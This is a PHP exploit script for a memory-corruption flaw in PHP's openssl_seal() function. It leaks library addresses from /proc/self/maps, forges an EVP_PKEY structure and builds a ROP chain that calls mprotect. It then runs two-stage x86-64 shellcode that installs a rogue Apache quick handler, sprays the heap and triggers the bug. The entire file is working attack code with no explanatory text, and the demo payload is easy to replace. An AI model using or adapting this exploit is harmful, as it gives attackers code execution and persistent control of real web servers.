<?php

// Source: http://akat1.pl/?id=1

function get_maps() {
        $fh = fopen("/proc/self/maps", "r");
        $maps = fread($fh, 331337);
        fclose($fh);
        return explode("\n", $maps);
}

function find_map($sym) {
    $addr = 0;
    foreach(get_maps() as $record)
        if (strstr($record, $sym) && strstr($record, "r-xp")) {
            $addr = hexdec(explode('-', $record)[0]);
            break;
        }

    if ($addr == 0)
            die("[-] can't find $sym base, you need an information leak :[");

    return $addr;
}

function fill_buffer($offset, $content) {
    global $buffer;
    for ($i = 0; $i < strlen($content); $i++)
        $buffer[$offset + $i] = $content[$i];
    return;
}

$pre = get_maps();
$buffer = str_repeat("\x00", 0xff0000);
$post = get_maps();

$tmp = array_diff($post, $pre);

if (count($tmp) != 1)
        die('[-] you need an information leak :[');

$buffer_base = hexdec(explode('-',array_values($tmp)[0])[0]);
$addr = $buffer_base+0x14; /* align to string */

echo "[+] buffer string @ 0x".dechex($addr)."\n";

$align = 0xff;
$addr += $align;

echo "[+] faking EVP_PKEY @ 0x".dechex($addr)."\n";
echo "[+] faking ASN @ 0x".dechex($addr)."\n";
fill_buffer($align + 12, pack('P', $addr));

$libphp_base = find_map("libphp7");
echo "[+] libphp7 base @ 0x".dechex($libphp_base)."\n";

/* pop x ; pop rsp ; ret - stack pivot */
$rop_addr = $libphp_base + 0x00000000004a79c3;
echo "[+] faking pkey_free @ 0x".dechex($addr+0xa0-4)." = ".dechex($rop_addr)."\n";
fill_buffer($align + 0xa0 - 4, pack('P', $rop_addr));

/* pop rbp ; pop rbp ; ret - clean up the stack after pivoting */
$rop_addr = $libphp_base + 0x000000000041d583;
fill_buffer($align - 4, pack('P', $rop_addr));

$libc_base = find_map("libc-");
echo "[+] libc base @ 0x".dechex($libc_base)."\n";

$mprotect_offset = 0xf4a20;
$mprotect_addr = $libc_base + $mprotect_offset;
echo "[+] mprotect @ 0x".dechex($mprotect_addr)."\n";

$mmap_offset = 0xf49c0;
$mmap_addr = $libc_base + $mmap_offset;
echo "[+] mmap @ 0x".dechex($mmap_addr)."\n";

$apache2_base = find_map("/usr/sbin/apache2");
echo "[+] apache2 base @ 0x".dechex($apache2_base)."\n";

$ap_rprintf_offset = 0x429c0;
$ap_rprintf_addr = $apache2_base + $ap_rprintf_offset;
echo "[+] ap_rprintf @ 0x".dechex($ap_rprintf_addr)."\n";

$ap_hook_quick_handler_offset = 0x56c00;
$ap_hook_quick_handler_addr = $apache2_base + $ap_hook_quick_handler_offset;
echo "[+] ap_hook_quick_handler @ 0x".dechex($ap_hook_quick_handler_addr)."\n";

echo "[+] building ropchain\n";
$rop_chain =
        pack('P', $libphp_base + 0x00000000000ea107) .  // pop rdx ; ret
        pack('P', 0x0000000000000007) .                 // rdx = 7
        pack('P', $libphp_base + 0x00000000000e69bd) .  // pop rsi ; ret
        pack('P', 0x0000000000004000) .                 // rsi = 0x1000
        pack('P', $libphp_base + 0x00000000000e5fd8) .  // pop rdi ; ret
        pack('P', $addr ^ ($addr & 0xffff)) .           // rdi = page aligned addr
        pack('P', $mprotect_addr) .                     // mprotect addr
        pack('P', ($addr ^ ($addr & 0xffff)) | 0x10ff); // return to shellcode_stage1
fill_buffer($align + 0x14, $rop_chain);

$shellcode_stage1 = str_repeat("\x90", 512) .
        "\x48\xb8" . pack('P', $buffer_base + 0x2018) .         // movabs shellcode_stage2, %rax
        "\x49\xb8" . pack('P', 0x1000) .                        // handler size
        "\x48\xb9" . pack('P', $buffer_base + 0x3018) .         // handler
        "\x48\xba" . pack('P', $ap_hook_quick_handler_addr) .   // movabs ap_hook_quick_handler, %rdx
        "\x48\xbe" . pack('P', 0) .                             // UNUSED
        "\x48\xbf" . pack('P', $mmap_addr) .                    // movabs mmap,%rdi
        "\xff\xd0" .                                            // callq %rax
        "\xb8\x27\x00\x00\x00" .                                // mov $0x27,%eax - getpid syscall
        "\x0f\x05" .                                            // syscall
        "\xbe\x1b\x00\x00\x00" .                                // mov $0xd,%esi - SIGPROF
        "\x89\xc7" .                                            // mov %eax,%edi - pid
        "\xb8\x3e\x00\x00\x00" .                                // mov $0x3e,%eax  - kill syscall
        "\x0f\x05";                                             // syscall
fill_buffer(0x1000, $shellcode_stage1);

$shellcode_stage2 = str_repeat("\x90", 512) .
        "\x55" .                        // push   %rbp
        "\x48\x89\xe5" .                // mov    %rsp,%rbp
        "\x48\x83\xec\x40" .            // sub    $0x40,%rsp
        "\x48\x89\x7d\xe8" .            // mov    %rdi,-0x18(%rbp)
        "\x48\x89\x75\xe0" .            // mov    %rsi,-0x20(%rbp)
        "\x48\x89\x55\xd8" .            // mov    %rdx,-0x28(%rbp)
        "\x48\x89\x4d\xd0" .            // mov    %rcx,-0x30(%rbp)
        "\x4c\x89\x45\xc8" .            // mov    %r8,-0x38(%rbp)
        "\x48\x8b\x45\xe8" .            // mov    -0x18(%rbp),%rax
        "\x41\xb9\x00\x00\x00\x00" .    // mov    $0x0,%r9d
        "\x41\xb8\xff\xff\xff\xff" .    // mov    $0xffffffff,%r8d
        "\xb9\x22\x00\x00\x00" .        // mov    $0x22,%ecx
        "\xba\x07\x00\x00\x00" .        // mov    $0x7,%edx
        "\xbe\x00\x20\x00\x00" .        // mov    $0x2000,%esi
        "\xbf\x00\x00\x00\x00" .        // mov    $0x0,%edi
        "\xff\xd0" .                    // callq  *%rax
        "\x48\x89\x45\xf0" .            // mov    %rax,-0x10(%rbp)
        "\x48\x8b\x45\xf0" .            // mov    -0x10(%rbp),%rax
        "\x48\x89\x45\xf8" .            // mov    %rax,-0x8(%rbp)
        "\xeb\x1d" .                    // jmp    0x40063d <shellcode+0x6d>
        "\x48\x8b\x45\xf8" .            // mov    -0x8(%rbp),%rax
        "\x48\x8d\x50\x01" .            // lea    0x1(%rax),%rdx
        "\x48\x89\x55\xf8" .            // mov    %rdx,-0x8(%rbp)
        "\x48\x8b\x55\xd0" .            // mov    -0x30(%rbp),%rdx
        "\x48\x8d\x4a\x01" .            // lea    0x1(%rdx),%rcx
        "\x48\x89\x4d\xd0" .            // mov    %rcx,-0x30(%rbp)
        "\x0f\xb6\x12" .                // movzbl (%rdx),%edx
        "\x88\x10" .                    // mov    %dl,(%rax)
        "\x48\x8b\x45\xc8" .            // mov    -0x38(%rbp),%rax
        "\x48\x8d\x50\xff" .            // lea    -0x1(%rax),%rdx
        "\x48\x89\x55\xc8" .            // mov    %rdx,-0x38(%rbp)
        "\x48\x85\xc0" .                // test   %rax,%rax
        "\x75\xd2" .                    // jne    0x400620 <shellcode+0x50>
        "\x48\x8b\x7d\xf0" .            // mov    -0x10(%rbp),%rdi
        "\x48\x8b\x45\xd8" .            // mov    -0x28(%rbp),%rax
        "\xb9\xf6\xff\xff\xff" .        // mov    $0xfffffff6,%ecx
        "\xba\x00\x00\x00\x00" .        // mov    $0x0,%edx
        "\xbe\x00\x00\x00\x00" .        // mov    $0x0,%esi
        "\xff\xd0" .                    // callq  *%rax
        "\xc9" .                        // leaveq
        "\xc3";                         // retq
fill_buffer(0x2000, $shellcode_stage2);

$handler =
        "\x55" .                                    // push   %rbp
        "\x48\x89\xe5" .                            // mov    %rsp,%rbp
        "\x48\x83\xec\x30" .                        // sub    $0x30,%rsp
        "\x48\x89\x7d\xd8" .                        // mov    %rdi,-0x28(%rbp)
        "\x48\xb8" . pack('P', $ap_rprintf_addr) .  // movabs $0xdeadbabefeedcafe,%rax
        "\x48\x89\x45\xf8" .                        // mov    %rax,-0x8(%rbp)
        "\x48\xb8" . "Hello Wo" .                   // movabs CONTENT,%rax
        "\x48\x89\x45\xe0" .                        // mov    %rax,-0x20(%rbp)
        "\x48\xb8" . "rld!\n\x00\x00\x00" .         // movabs CONTENT,%rax
        "\x48\x89\x45\xe8" .                        // mov    %rax,-0x20(%rbp)
        "\x48\x8d\x4d\xe0" .                        // lea    -0x20(%rbp),%rcx
        "\x48\x8b\x55\xd8" .                        // mov    -0x28(%rbp),%rdx
        "\x48\x8b\x45\xf8" .                        // mov    -0x8(%rbp),%rax
        "\x48\x89\xce" .                            // mov    %rcx,%rsi
        "\x48\x89\xd7" .                            // mov    %rdx,%rdi
        "\xff\xd0" .                                // callq  *%rax
        "\xb8\x00\x00\x00\x00" .                    // mov    $0x0,%eax
        "\xc9" .                                    // leaveq
        "\xc3";                                     // retq
fill_buffer(0x3000, $handler);

$addr = pack('P', $addr);
$memory = str_repeat($addr,321);

$pem = "
-----BEGIN PUBLIC KEY-----
MCwwDQYJKoZIhvcNAQEBBQADGwAwGAIRANG2dvm8oNiH3IciNd44VZcCAwEAAQ==
-----END PUBLIC KEY-----"; /* Random RSA key */

$a = array_fill(0,321,0);
/* place valid keys at the beginning */
$k = openssl_pkey_get_public($pem);
$a[0] = $k; $a[1] = $k; $a[2] = $k;
echo "[+] spraying heap\n";
$x = array();
for ($i = 0 ; $i < 20000 ; $i++) {
        $x[$i] = str_repeat($memory, 1);
}
for ($i = 0 ; $i < 20000 ; $i++) {
        unset($x[$i]);
}
unset($x);
echo "[+] triggering openssl_seal()...\n";
@openssl_seal($_, $_, $_, $a);
echo "[-] failed ;[\n";